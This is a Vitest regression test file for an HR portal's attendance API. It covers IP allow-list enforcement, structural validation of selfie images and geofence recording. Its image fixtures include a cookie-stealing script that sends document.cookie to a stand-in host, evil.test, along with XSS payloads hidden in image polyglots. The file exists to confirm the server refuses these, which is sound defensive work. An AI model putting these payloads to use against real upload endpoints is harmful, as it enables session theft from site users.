import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { EDGE_HEADER } from '../../middleware/edge-gate.js';
import { auditRows, createApiHarness, seedMembership, seedOrg, seedUser, uuid, type ApiHarness, type OrgFixture } from '../../test/features-harness.js';

/**
 * Regression tests of the HR portal Prompt 4 review on the punch side, behind the edge (EDGE_SHARED_SECRET set — the one setup
 * in which the client address can be trusted): the IP allow-list is saved and enforced (4-P2-18), selfie photos are validated
 * structurally and served by the API with their detected type and nosniff (4-P2-17), and every punch records the B-36
 * geofence fact the engine reads (4-P2-7). The no-edge half of P2-18 is in portal-review-fixes.test.ts.
 */
vi.setConfig({ testTimeout: 120_000, hookTimeout: 300_000 });
const EDGE_SECRET = 'p4f-edge-shared-secret-0001';
let h: ApiHarness; let f: OrgFixture;
const base = () => `/api/v1/orgs/${f.orgId}`;
let seq = 0;
const key = () => `p4f-edge-${process.pid}-${(seq += 1)}`;
/** Every request passes through the edge (the gate refuses the rest). */
const req = (method: string, path: string, o: { token?: string; body?: unknown; headers?: Record<string, string> } = {}) => h.request(method, path, { ...o, headers: { [EDGE_HEADER]: EDGE_SECRET, ...(o.headers ?? {}) } });
const OFFICE = { lat: 23.588, lng: 58.3829 };
const FAR = { lat: 23.62, lng: 58.45 };

async function setSelfService(patch: Record<string, unknown>): Promise<void> {
  const row = await h.admin.selectFrom('organizationSettings').select('attendance').where('organizationId', '=', f.orgId).executeTakeFirstOrThrow();
  const att = (typeof row.attendance === 'string' ? JSON.parse(row.attendance) : row.attendance ?? {}) as Record<string, unknown>;
  await h.admin.updateTable('organizationSettings').set({ attendance: JSON.stringify({ ...att, selfService: { ...((att['selfService'] as Record<string, unknown>) ?? {}), ...patch } }) }).where('organizationId', '=', f.orgId).execute();
}
const punch = (body: Record<string, unknown>, headers: Record<string, string> = {}, token = f.employeeUser) => req('POST', `${base()}/me/punch`, { token, body: { channel: 'web', idempotencyKey: key(), ...body }, headers });
const lastRaw = async (employeeId: string) => (await h.admin.selectFrom('attendanceRawTransactions').select(['rawPayload', 'direction']).where('organizationId', '=', f.orgId).where('employeeId', '=', employeeId).orderBy('id', 'desc').executeTakeFirstOrThrow());

// ----- image fixtures ---------------------------------------------------------------------------------------------------------------
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
/** A PNG with one extra ancillary chunk before IEND (the CRC is not checked: structure only). */
function pngWithChunk(type: string, data: Buffer): Buffer {
  const chunk = Buffer.alloc(12 + data.length);
  chunk.writeUInt32BE(data.length, 0); chunk.write(type, 4, 'latin1'); data.copy(chunk, 8);
  return Buffer.concat([PNG.subarray(0, PNG.length - 12), chunk, PNG.subarray(PNG.length - 12)]);
}
/** SOI, a JFIF APP0 segment, EOI. */
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xff, 0xd9]);
function jpegWithComment(text: string): Buffer {
  const body = Buffer.from(text, 'latin1');
  const com = Buffer.alloc(4 + body.length);
  com.writeUInt16BE(0xfffe, 0); com.writeUInt16BE(body.length + 2, 2); body.copy(com, 4);
  return Buffer.concat([JPEG.subarray(0, JPEG.length - 2), com, JPEG.subarray(JPEG.length - 2)]);
}
/** RIFF sized to the file, WEBP, one VP8L chunk (5 bytes + pad). */
const WEBP = (() => {
  const b = Buffer.alloc(26);
  b.write('RIFF', 0, 'latin1'); b.writeUInt32LE(18, 4); b.write('WEBP', 8, 'latin1'); b.write('VP8L', 12, 'latin1'); b.writeUInt32LE(5, 16); b.set([0x2f, 0, 0, 0, 0], 20);
  return b;
})();
const HTML = Buffer.from('<html><body><script>fetch("https://evil.test/?c="+document.cookie)</script></body></html>', 'latin1');

beforeAll(async () => {
  h = await createApiHarness(`flowza_api_portal_fixes_edge_${process.pid}`, { config: { EDGE_SHARED_SECRET: EDGE_SECRET } });
  f = await seedOrg(h.admin, 'edge');
});
afterAll(async () => { await h?.close(); });

describe('4-P2-18 behind the edge the IP allow-list is saved and enforced', () => {
  it('4-P2-18 the list saves with the edge secret configured and refuses a punch from outside it', async () => {
    // the gate itself: a request that did not come through the edge is refused
    expect((await h.request('GET', `${base()}/me/punch/status?channel=web`, { token: f.employeeUser })).status).toBe(403);
    const current = (await req('GET', `${base()}/settings/attendance`, { token: f.owner })).body.data;
    const saved = await req('PUT', `${base()}/settings/attendance`, { token: f.owner, body: { ...current, selfService: { ...current.selfService, webCheckIn: true, requireGeofence: 'off', duplicatePunchSeconds: 0, ipAllowList: ['10.0.0.0/8', '2001:db8::/32'] } } });
    expect(saved.status).toBe(200);
    expect(saved.body.data.selfService.ipAllowList).toEqual(['10.0.0.0/8', '2001:db8::/32']);
    const blocked = await punch({ direction: 'in' }, { 'x-forwarded-for': '192.168.1.5' });
    expect(blocked.status).toBe(403);
    expect(blocked.body.details.reason).toBe('IP_NOT_ALLOWED');
    const allowed = await punch({ direction: 'in' }, { 'x-forwarded-for': '10.1.2.3' });
    expect(allowed.status).toBe(201);
    expect((await lastRaw(f.e1)).rawPayload).toMatchObject({ ip: '10.1.2.3' });
    await setSelfService({ ipAllowList: [] });
  });
});

describe('4-P2-17 selfie photos are validated structurally and served with their detected type', () => {
  const selfie = (image: Buffer, prefix = '') => req('POST', `${base()}/me/selfie-checkin`, { token: f.employeeUser, body: { direction: 'in', imageBase64: `${prefix}${image.toString('base64')}` } });
  beforeAll(async () => {
    await setSelfService({ allowSelfieCheckIn: true, duplicatePunchSeconds: 0 });
    await h.admin.insertInto('employeeAttendanceGrants').values({ employeeId: f.e1, organizationId: f.orgId, openAttendance: true, selfieRequired: false }).execute();
  });

  it('4-P2-17 a polyglot is refused whatever its first bytes say (probe P13)', async () => {
    const polyglots: Record<string, Buffer> = {
      'JPEG + trailing HTML': Buffer.concat([JPEG, HTML]),
      'JPEG with a script in a comment segment': jpegWithComment('<script>alert(1)</script>'),
      'PNG + trailing HTML': Buffer.concat([PNG, HTML]),
      'PNG with markup in a text chunk': pngWithChunk('tEXt', Buffer.from('Comment\0<html><svg onload=alert(1)>', 'latin1')),
      'WebP + trailing HTML': Buffer.concat([WEBP, HTML]),
      'JPEG start, no end': JPEG.subarray(0, JPEG.length - 2),
    };
    const statuses: Record<string, number> = {};
    for (const [name, bytes] of Object.entries(polyglots)) statuses[name] = (await selfie(bytes)).status;
    expect(statuses).toEqual(Object.fromEntries(Object.keys(polyglots).map((k) => [k, 400])));
    expect(await h.admin.selectFrom('selfieCheckins').select('id').where('organizationId', '=', f.orgId).execute()).toEqual([]);
  });

  it('4-P2-17 a valid photo is stored and served as the type its bytes say (never the declared one), with nosniff', async () => {
    for (const image of [WEBP, pngWithChunk('tEXt', Buffer.from('Software\0FlowZa camera', 'latin1'))]) expect((await selfie(image)).status).toBe(201);
    // declared as PNG, the bytes are a JPEG: stored and served as a JPEG
    const r = await selfie(JPEG, 'data:image/png;base64,');
    expect(r.status).toBe(201);
    const row = await h.admin.selectFrom('selfieCheckins').select(['photoPath']).where('id', '=', r.body.data.id).executeTakeFirstOrThrow();
    expect(row.photoPath.endsWith('.jpg')).toBe(true);
    expect(h.uploads.get(`employee-photos/${row.photoPath}`)?.contentType).toBe('image/jpeg');
    for (const [path, token] of [[`/me/selfie-checkins/${r.body.data.id}/photo`, f.employeeUser], [`/attendance/selfie-checkins/${r.body.data.id}/photo`, f.managerUser]] as const) {
      const photo = await req('GET', `${base()}${path}`, { token });
      expect(photo.status).toBe(200);
      expect(photo.headers.get('x-content-type-options')).toBe('nosniff');
      expect(photo.body.data).toMatchObject({ contentType: 'image/jpeg', url: `data:image/jpeg;base64,${JPEG.toString('base64')}` });
      expect(JSON.stringify(photo.body.data)).not.toContain('storage.test');
    }
  });

  it('4-P2-17 an object stored before the validation that is not a valid image is refused, not served', async () => {
    const id = uuid('5');
    const photoPath = `checkins/${f.orgId}/${f.e1}/${id}.png`;
    h.uploads.set(`employee-photos/${photoPath}`, { body: Buffer.concat([PNG, HTML]), contentType: 'image/png' });
    await h.admin.insertInto('selfieCheckins').values({ id, organizationId: f.orgId, employeeId: f.e1, branchId: f.branchA, direction: 'in', photoPath, status: 'pending' }).execute();
    const photo = await req('GET', `${base()}/me/selfie-checkins/${id}/photo`, { token: f.employeeUser });
    expect(photo.status).toBe(409);
    expect(photo.body.details).toMatchObject({ reason: 'PHOTO_INVALID' });
    expect(photo.text).not.toContain('<script');
    expect((await auditRows(h.admin, 'attendance.selfie_photo_refused')).some((a) => a.entityId === id)).toBe(true);
  });
});

describe('4-P2-7 every punch records the B-36 geofence fact', () => {
  it('4-P2-7 true inside a fence, false only when a real fence was evaluated and failed, null when the location is unknown or no fence applies', async () => {
    await setSelfService({ webCheckIn: true, requireGeofence: 'flag', duplicatePunchSeconds: 0, ipAllowList: [], allowSelfieCheckIn: false });
    await h.admin.deleteFrom('employeeAttendanceGrants').where('organizationId', '=', f.orgId).execute();
    const fence = await req('POST', `${base()}/geofences`, { token: f.hrAdmin, body: { name: 'HQ', branchId: f.branchA, latitude: OFFICE.lat, longitude: OFFICE.lng, radiusM: 150, enforcement: 'soft_warn', accuracyThresholdM: 100 } });
    expect(fence.status).toBe(201);
    // e1 last punched `in` (the IP test): out, in, out
    expect((await punch({ direction: 'out', ...OFFICE, accuracy: 10 })).status).toBe(201);
    expect((await lastRaw(f.e1)).rawPayload).toMatchObject({ verdict: 'allowed', withinGeofence: true });
    expect((await punch({ direction: 'in', ...FAR, accuracy: 10 })).status).toBe(201);
    expect((await lastRaw(f.e1)).rawPayload).toMatchObject({ verdict: 'flagged', withinGeofence: false });
    expect((await punch({ direction: 'out' })).status).toBe(201);
    expect((await lastRaw(f.e1)).rawPayload).toMatchObject({ verdict: 'flagged', verdictReason: 'location_missing', withinGeofence: null });
    // an employee no fence applies to (branch B): unknown, whatever the location
    const user = uuid('c');
    await seedUser(h.admin, user, 'edge-e2@test.local', 'Employee 2');
    await seedMembership(h.admin, f.orgId, user, '10000000-0000-0000-0000-000000000008', { employeeId: f.e2 });
    expect((await punch({ direction: 'in', ...FAR, accuracy: 10 }, {}, user)).status).toBe(201);
    expect((await lastRaw(f.e2)).rawPayload).toMatchObject({ verdictReason: 'no_fences_assigned', withinGeofence: null });
  });
});
